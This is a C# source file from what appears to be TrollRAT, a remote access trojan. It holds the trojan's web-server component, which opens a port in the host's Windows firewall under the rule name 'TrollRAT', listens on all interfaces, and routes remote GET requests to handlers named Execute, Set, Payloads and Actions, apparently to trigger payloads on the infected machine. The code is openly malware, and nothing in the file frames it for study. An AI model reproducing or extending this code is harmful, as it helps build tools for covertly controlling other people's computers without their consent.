using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Reflection;
using System.Web;
using System.Text.RegularExpressions;

namespace TrollRAT.Server
{
    public abstract class WebServerCommandBase
    {
        public abstract Regex Path { get; }
        public abstract void execute(HttpListenerContext context);

        public void respondString(string str, HttpListenerResponse response, string contentType)
        {
            respondBytes(Encoding.UTF8.GetBytes(str), response, contentType);
        }

        public void respondBytes(byte[] data, HttpListenerResponse response, string contentType)
        {
            response.ContentLength64 = data.Length;
            response.StatusCode = 200;
            response.ContentType = contentType;

            response.OutputStream.Write(data, 0, data.Length);
        }
    }

    public abstract class WebServerCommand : WebServerCommandBase
    {
        protected List<Payload> payloads;

        public WebServerCommand(List<Payload> payloads)
        {
            this.payloads = payloads;
        }
    }

    public abstract class WebServerBase
    {
        protected int port;
        public int Port => port;

        protected List<WebServerCommandBase> commands = new List<WebServerCommandBase>();
        public List<WebServerCommandBase> Commands => commands;

        public WebServerBase(int port)
        {
            this.port = port;
        }

        public void run()
        {
            HttpListener listener = new HttpListener();
            listener.Prefixes.Add(String.Format("http://*:{0}/", port));
            listener.Start();

            while (listener.IsListening)
            {
                var context = listener.GetContext();

                if (context.Request.HttpMethod == "GET")
                {
                    var path = context.Request.Url.AbsolutePath;
                    bool processed = false;

                    foreach (WebServerCommandBase cmd in commands)
                    {
                        if (cmd.Path.IsMatch(path))
                        {
                            cmd.execute(context);

                            processed = true;
                            break;
                        }
                    }

                    if (!processed)
                    {
                        context.Response.StatusCode = 404;
                    }

                    context.Response.Close();
                }
            }
        }
    }

    public class WebServer : WebServerBase
    {
        private List<Payload> payloads = new List<Payload>();
        public List<Payload> Payloads => payloads;

        public WebServer(int port) : base(port)
        {
            Firewall.openPort("TrollRAT", port, NetFwTypeLib.NET_FW_IP_PROTOCOL_.NET_FW_IP_PROTOCOL_TCP);

            commands.Add(new RootCommand());
            commands.Add(new PayloadsCommand(payloads));

            commands.Add(new SettingsCommand(payloads));
            commands.Add(new ActionsCommand(payloads));

            commands.Add(new ExecuteCommand(payloads));
            commands.Add(new SetCommand(payloads));
        }
    }
}
